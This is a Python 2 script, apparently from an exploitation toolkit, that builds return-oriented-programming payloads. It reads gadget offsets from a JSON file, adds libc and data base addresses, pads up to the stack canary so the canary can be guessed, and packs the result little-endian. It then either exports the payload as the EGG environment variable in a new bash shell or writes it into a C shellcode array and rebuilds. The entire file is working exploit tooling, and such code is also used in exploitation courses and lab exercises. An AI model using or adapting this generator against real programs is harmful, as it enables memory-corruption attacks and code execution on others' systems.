import os
import sys
import json
import subprocess

class GenerateROPShellcode(object):
    """
    @params
    padding: padding value for the program to be exploited
    id: The id of the ROP code that needs to be converted to shellcode
    json_file: JSON file in which the code is stored - src/rop/rop_codes.json
    write_code: Write the code into a file rather than set it as an environment variable in a new bash
    file_name: Name of the file into which the shellcode should be written into
    line_num: Line number at which the shellcode array should be inserted
    """
    def __init__(self, padding, _id, json_file, write_code=False, file_name=None, line_num=-1):
        self._id = _id
        self.code = ''
        self.padding = padding
        self.json_file = json_file
        self.libc_base = 0x0
        self.data_base = 0x0
        self.addresses = []
        self.shellcode = ''
        self.write_code = write_code
        self.file_name = None
        self.line_num = -1
        self.FNULL = open(os.devnull, 'w')

    """
    This function reads the values from the chosen JSON entry.
    Values read:
    libc_base
    data_base
    code
    """
    def get_values(self):
        with open(self.json_file) as json_file:
            json_data = json.load(json_file)
            for k, v in json_data.iteritems():
                for values in v:
                    if values['id'] is self._id:
                        self.code = values['code']
                        self.libc_base = hex(int(values['libc_base'].replace('L', ''), 16))
                        self.data_base = hex(int(values['data_base'].replace('L', ''), 16))
        self.construct_shellcode()

    """
    The function constructs the shellcode.
        1. Adds the ROP commands' addresses to libc_base.
        2. Adds address offset to data_base.
        3. Leaves padding and data as is.
        4. Adds padding to the beginning of the addresses have been chained together.
        5. Performs Little Endian formatting.
        6. Either writes the code into a file or sets it as an environment variable.
    """
    def construct_shellcode(self):
        commands = self.code.split('\n')
        for command in commands:
            tokens = command.split(':')
            if tokens[0].strip() == 'ROP command':
                self.addresses.append(hex(int(self.libc_base.replace('L', ''), 16) + int(tokens[1].replace('L', '').strip(), 16)))
            elif tokens[0].strip() == 'Address':
                self.addresses.append(hex(int(self.data_base.replace('L', ''), 16) + int(tokens[1].replace('L', '').strip(), 16)))
            else:
                self.addresses.append(hex(int(tokens[1].replace('L', '').strip(), 16)))

        # Pad only till the canary bytes so that they can be guessed
        for i in range(0, self.padding):
            self.shellcode += '90'.decode('hex')

        # self.read_stack()

        for address in self.addresses:
            self.shellcode += (address[2:].replace('L', '').zfill(8).decode('hex'))[::-1]

        if self.write_code:
            if self.file_name is None:
                self.file_name = input('To which file would you like to write the shellcode? ')
            fo = open(self.file_name, 'r')
            contents = fo.readlines()
            fo.close()
            fo = open(self.file_name, 'w+')
            shellcode = 'const char default_shellcode[] = "'
            for item in list(self.shellcode):
                shellcode += ('\\x' + item.encode('hex'))
            shellcode += '";\n'
            if self.line_num == -1:
                self.line_num = input('At which line would you like to insert the shellcode? ')
            if ('default_shellcode' in contents[self.line_num - 1]):
                contents[self.line_num - 1] = shellcode
            else:
                contents.insert(self.line_num, shellcode)
            contents = ''.join(contents)
            fo.write(contents)
            fo.close()
            subprocess.call('./rebuild.sh', shell=False, stdout=self.FNULL, stderr=self.FNULL)
        else:
            os.putenv('EGG', self.shellcode)
            subprocess.call('/bin/bash', shell=True)

def main():
    if len(sys.argv) < 4:
        print 'Padding, ID of rop code and json file required.\n'
    elif len(sys.argv) == 4:
        generator = GenerateROPShellcode(padding=int(sys.argv[1]),_id=int(sys.argv[2]), json_file=sys.argv[3])
        generator.get_values()
    else:
        generator = GenerateROPShellcode(padding=int(sys.argv[1]),_id=int(sys.argv[2]), json_file=sys.argv[3], write_code=(sys.argv[4] == 'write'))
        generator.get_values()

if __name__ == '__main__':
    main()